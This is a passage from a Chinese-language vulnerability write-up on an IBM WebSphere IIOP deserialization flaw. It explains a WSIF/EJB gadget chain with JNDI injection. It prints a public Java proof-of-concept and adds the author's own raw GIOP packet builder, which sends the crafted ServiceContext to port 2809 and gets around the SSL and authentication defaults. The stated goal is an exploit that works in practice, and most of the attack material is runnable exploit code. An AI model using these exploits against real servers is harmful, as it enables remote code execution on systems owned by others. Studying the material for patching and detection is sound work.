就是开头介绍的 `WSIF API`几步，里面所有参数都是可以控制的，因为当 `lookup` 到这里的时候，就是为了 `decode` 我们构造的
`reference` 对象。
仔细看一下，如果我们指定 `renferce` 的 `className` 为 `WSIFServiceStubRef.class` 的时候，回顾开头对
`WSIF API` 的 `4` 个步骤，会发现除了调用方法名以及其参数之外，里面用到的参数都再这里了，这意味着如果这个代理对象从 `lookup`
这里出去后，对这个对象有任何的接口方法调用，我们都是可以根据 `WSIF` 的 `java binding` 来控制其真正执行方法的对象以及要执行的方法的
再看下 `lookup` 后的流程，是将 `lookup` 回来的对象转换成 `EJBHome` ,然后调用 `findFindByPrimaryKey`
方法
`EJBHome` 这个接口并没有 `findFindByPrimaryKey` 这个方法，所以需要去找它的子类，`CounterHome` 就是其中一个
现在让我们看一下利用链要怎么构造，由于 `EntityHandle` 这个类只实现了 `Handler` 接口，没有实现 `EJBObject`
接口，我们可以自行实现 `EJBObject` 接口，让其返回
我们特定构造的 `EntityHandle` 对象绑定我们的RMI地址去进行 `jndi` 注入
赋值给 `WSIFPort_EJB` 即可
然后起个 `RMI` 绑定一下我们构造的 `WSIF Reference`
以下为互联网公开的漏洞 POC 利用详细代码：
    public static void main(String[] args) throws NamingException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        System.getProperties().put("com.ibm.CORBA.ConfigURL","file:////sas.client.props");
        System.getProperties().put("com.ibm.SSL.ConfigURL","file://ssl.client.props");
        WSIFPort_EJB wsifPort_ejb = new WSIFPort_EJB(null, null, null);
        Field field = wsifPort_ejb.getClass().getDeclaredField("fieldEjbObject");
        field.setAccessible(true);
        field.set(wsifPort_ejb, new MyEJBObject());
        Properties env = new Properties();
        env.put(Context.PROVIDER_URL, "iiop://127.0.0.1:2809/");
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.ibm.websphere.naming.WsnInitialContextFactory");
        InitialContext context = new InitialContext(env);
        context.list("");
        Field f_defaultInitCtx = context.getClass().getDeclaredField("defaultInitCtx");
        f_defaultInitCtx.setAccessible(true);
        WsnInitCtx defaultInitCtx = (WsnInitCtx) f_defaultInitCtx.get(context);
        Field f_context = defaultInitCtx.getClass().getDeclaredField("_context");
        f_context.setAccessible(true);
        CNContextImpl _context = (CNContextImpl) f_context.get(defaultInitCtx);
        Field f_corbaNC = _context.getClass().getDeclaredField("_corbaNC");
        f_corbaNC.setAccessible(true);
        _NamingContextStub _corbaNC = (_NamingContextStub) f_corbaNC.get(_context);
        Field f__delegate = ObjectImpl.class.getDeclaredField("__delegate");
        f__delegate.setAccessible(true);
        ClientDelegate clientDelegate = (ClientDelegate) f__delegate.get(_corbaNC);
        Field f_ior = clientDelegate.getClass().getSuperclass().getDeclaredField("ior");
        f_ior.setAccessible(true);
        IOR ior = (IOR) f_ior.get(clientDelegate);
        Field f_orb = clientDelegate.getClass().getSuperclass().getDeclaredField("orb");
        f_orb.setAccessible(true);
        ORB orb = (ORB) f_orb.get(clientDelegate);
        GIOPImpl giop = (GIOPImpl) orb.getServerGIOP();
        Method getConnection = giop.getClass().getDeclaredMethod("getConnection", com.ibm.CORBA.iiop.IOR.class, Profile.class, ClientDelegate.class, String.class);
        getConnection.setAccessible(true);
        Connection connection = (Connection) getConnection.invoke(giop, ior, ior.getProfile(), clientDelegate, "");
        Method setConnectionContexts = connection.getClass().getDeclaredMethod("setConnectionContexts", ArrayList.class);
        setConnectionContexts.setAccessible(true);
        CDROutputStream outputStream = ORB.createCDROutputStream();
        outputStream.putEndian();
        Any any = orb.create_any();
        any.insert_Value(wsifPort_ejb);
        PropagationContext propagationContext = new PropagationContext(
                0,
                new TransIdentity(null, null, new otid_t(0,0,new byte[0])),
                new TransIdentity[0],
                any
        );
        PropagationContextHelper.write(outputStream, propagationContext);
        byte[] result = outputStream.toByteArray();
        ServiceContext serviceContext = new ServiceContext(0, result);
        ArrayList arrayList = new ArrayList();
        arrayList.add(serviceContext);
        setConnectionContexts.invoke(connection, arrayList);
        context.list("");
     }
## 一些思考
`WAS` 默认对 `RMI/IIOP` 开启了 `SSL` 和 `Basic` 认证，前面为了聚焦漏洞我把 `WAS` 的 `SSL`
关了，如果没关，又没指定 `SSL` 配置文件的话，直接用互联网中公开的漏洞利用方案在设置 `ServiceContext`
时相关的代码会直接报错抛出异常。
而且开启了也不能直接打，因为还有个 `BasicAuth` ，会弹出用户名密码验证框，不知道账户密码的话，敲一下回车也能过去
可以抓包和 Debug 一下源码看一下为什么会这样，在 `WsnInitCtx` 上下文中 `list` 或者 `lookup` 的实现是，先去发个
`locateRequset` 去 `BooStrap` 那获取 `NamingService` 的地址，拿到 `NamingService` 的
`IOR` 后再发送 `Request` 请求，如果 `WAS` 没启用 `SSL` 的话，在服务器返回的 `IOR Profile` 中是会带有端口指明
`NamingService` 的端口。
如果 `BootStrap` 返回的 `IOR` 只带有 `Host` ，端口为 0，但是在返回的 `IOR` 中会有 `SSL` 的相关内容，则说明是要走
`SSL` 端口的，如果我们的客户端没配置 `SSL` 属性的话，那他是不会走 `SSL` 连接的，而是直接连接 `host:0`，肯定连不上
问题就出在这里，因为本质上，要进入到本次的反序列化调用点，根本是不需要一个 `LocateRequst` 的，我们可以 `debug` 看一下，在
`WAS` 的服务端在接受 `iiop` 请求时，会先经过几个拦截器的处理，默认情况下一共`7` 个拦截器
取决于 `Corba` 客户端的请求类型，执行不同的逻辑
       private void invokeInterceptor(ServerRequestInterceptor var1, ServerRequestInfoImpl var2) throws ForwardRequest {
            switch(var2.state) {
            case 8:
                var1.receive_request_service_contexts(var2);
                break;
            case 9:
                var1.receive_request(var2);
                break;
            case 10:
                var1.send_reply(var2);
                break;
            case 11:
                var1.send_exception(var2);
                break;
            case 12:
                var1.send_other(var2);
                break;
            default:
                throw new INTERNAL("Unexpected state for ServerRequestInfo: " + var2.state);
            }
        }
其中只要是 `Request` 请求，就能进入到 `TxServerInterceptor` 的 `receive_request`，进行后面的
`ServiceContext` 处理操作，触发本次的反序化过程
所以想写个实战能用的 POC 或者 EXP 的话，直接用 WAS 的 `JNDI API` 肯定不行的，可以再找一下可以直接发 `Request` 和设置
`ServiceContext` 的 `API` 。或者考虑手动构造一下数据包，默认端口没改的情况下，直接打2809或者9100,至于怎么构造，可以参考一下
[GIOP规范](https://docs.oracle.com/cd/E13211_01/wle/wle42/corba/giop.pdf) 和
`JDK` 或者 `IBM` 的那套 `corba api` ，下面演示一下大致的构造过程
直接用 `Oracle JDK` 的 原生 `corba API` 请求一下 `2809`，就会发现客户端发的是一个带有 `ServiceContext`
的 `Request` 请求的
参照 GIOP 规范，整个 GIOP 头是固定的 12 个字节，其中第 8 个字节是请求类型
再参照一下这个 API 是怎么发包的，先是十二个字节的 GIOP 头
然后是一个固定的 4 字节 `ServiceContext` 的数目
后面就是 `ServiceContext` 格式也是固定的
写完 `ServiceContext` 后，是下面这个格式
所以，大致的验证代码如下：
    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException {
        WSIFPort_EJB wsifPort_ejb = new WSIFPort_EJB(null, null, null);
        Field field = wsifPort_ejb.getClass().getDeclaredField("fieldEjbObject");
        field.setAccessible(true);
        field.set(wsifPort_ejb, new MyEJBObject());
        Socket socket = new Socket();
        InetSocketAddress inetSocketAddress = new InetSocketAddress("127.0.0.1", 2809);
        socket.connect(inetSocketAddress,0);
        socket.setKeepAlive(true);
        socket.setTcpNoDelay(true);
        OutputStream outputStream = socket.getOutputStream();
        EncoderOutputStream cdrOutputStream = (EncoderOutputStream)ORB.createCDROutputStream();
        cdrOutputStream.write_long(1195986768);
        cdrOutputStream.write_octet((byte)1);//GIOPMajor
        cdrOutputStream.write_octet((byte)0);//GIOPMinor
        cdrOutputStream.write_octet((byte)0);//flags
        cdrOutputStream.write_octet((byte)0);//type //request
        Object sizePosition = cdrOutputStream.writePlaceHolderLong((byte) 0);//size
        cdrOutputStream.write_long(1);//ServiceContext size
        CDROutputStream outputStream2 = ORB.createCDROutputStream();
        outputStream2.putEndian();
        Any any = ORB.init().create_any();
        any.insert_Value(wsifPort_ejb);
        PropagationContext propagationContext = new PropagationContext(
                0,
                new TransIdentity(null, null, new otid_t(0,0,new byte[0])),
                new TransIdentity[0],
                any
        );
        PropagationContextHelper.write(outputStream2, propagationContext);
        byte[] result = outputStream2.toByteArray();
        ServiceContext serviceContext = new ServiceContext(0, result);
        serviceContext.write(cdrOutputStream);
        int writeOffset2 = cdrOutputStream.getByteBuffer().getWriteOffset();
        System.out.println(writeOffset2);
        cdrOutputStream.write_long(6);//requestID
        cdrOutputStream.write_octet((byte)1);//responseExpeced
        ObjectKey objectKey = new ObjectKey("NameService".getBytes());
        cdrOutputStream.write_long(objectKey.length());
        cdrOutputStream.write_octet_array(objectKey.getBytes(), 0, objectKey.length());
        cdrOutputStream.write_long(3);
        cdrOutputStream.write_octet_array("get".getBytes(),0,3);
        cdrOutputStream.write_long(0);
        cdrOutputStream.write_long(0);
        int writeOffsetEND = cdrOutputStream.getByteBuffer().getWriteOffset();
        cdrOutputStream.rewriteLong(writeOffsetEND-12,sizePosition);
        cdrOutputStream.getByteBuffer().flushTo(outputStream);
        System.in.read();
    }
结果
## 参考
  * 
  * 
  * 
  * 